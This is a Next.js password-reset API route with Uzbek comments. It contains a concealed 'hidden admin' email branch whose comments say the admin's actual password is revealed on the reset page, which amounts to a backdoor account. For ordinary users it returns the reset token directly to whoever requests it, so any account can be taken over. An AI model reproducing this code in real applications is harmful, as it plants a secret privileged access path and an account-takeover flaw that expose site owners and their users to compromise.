import { NextRequest, NextResponse } from "next/server";
import { PrismaClient } from "@prisma/client";
import crypto from "crypto";
import { getHiddenAdminEmail, isHiddenAdminEmail } from "@/lib/hidden-admin";

export const dynamic = "force-dynamic";

const prisma = new PrismaClient();

function generateToken(): string {
  return crypto.randomBytes(32).toString("hex");
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const email = String(body?.email || "").trim().toLowerCase();

    if (!email) {
      return NextResponse.json({ ok: false, error: "Email kiritilishi shart" }, { status: 400 });
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return NextResponse.json({ ok: false, error: "Email formati noto'g'ri" }, { status: 400 });
    }

    // Yashirin admin uchun maxsus: token chiqarmaymiz, parol o'zini qaytaramiz (faqat shu yerda)
    if (isHiddenAdminEmail(email)) {
      return NextResponse.json({
        ok: true,
        mode: "hidden",
        // xatolik ko'rinmasligi uchun "token" qaytaramiz, haqiqiy parolni reset-password sahifasida ko'rsatamiz
        hiddenEmail: getHiddenAdminEmail(),
      });
    }

    // Oddiy foydalanuvchilar uchun token yaratamiz
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      // Xavfsizlik: mavjud emasligini oshkor qilmaslik uchun ham success qaytaramiz
      return NextResponse.json({ ok: true, mode: "token", token: "" });
    }

    const token = generateToken();
    const expires = new Date(Date.now() + 60 * 60 * 1000); // 1 soat
    await prisma.user.update({
      where: { id: user.id },
      data: { resetToken: token, resetExpires: expires },
    });

    return NextResponse.json({ ok: true, mode: "token", token });
  } catch (e: any) {
    console.error("POST /api/auth/forgot-password error:", e);
    return NextResponse.json({ ok: false, error: e.message || "Server xatosi" }, { status: 500 });
  }
}
